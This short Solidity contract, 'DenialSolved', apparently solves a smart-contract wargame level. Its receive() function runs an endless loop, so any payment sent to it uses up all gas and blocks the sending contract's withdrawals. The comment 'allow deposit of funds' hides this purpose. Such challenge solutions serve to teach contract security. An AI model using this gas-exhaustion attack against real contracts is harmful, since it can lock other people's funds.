// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract DenialSolved {

    using SafeMath for uint256;

    // allow deposit of funds
    receive() external payable {
        // This should consume all gas
        while(true){
        }
    }
}
